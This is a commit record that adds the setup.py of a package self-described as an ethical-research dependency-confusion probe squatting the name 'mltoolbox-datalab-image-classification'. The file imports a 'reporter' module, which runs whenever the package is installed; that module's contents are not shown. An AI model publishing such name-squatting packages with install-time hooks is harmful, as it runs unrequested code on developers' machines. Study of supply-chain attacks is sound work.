b39eaa5cbdc104f2488429bc38865454fb13b67f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:00:08 +0000

    Add package mltoolbox-datalab-image-classification/0.2/mltoolbox-datalab-image-classification-0.2.tar.gz

---
+++ packages/mltoolbox-datalab-image-classification/mltoolbox-datalab-image-classification-0.2.tar.gz/mltoolbox-datalab-image-classification-0.2/setup.py
@@ -0,0 +1,4 @@
+from setuptools import setup
+import reporter
+
+setup(name='mltoolbox-datalab-image-classification', version='0.2', description='Ethical research - dep confusion package. This is not a real package, do not install.')
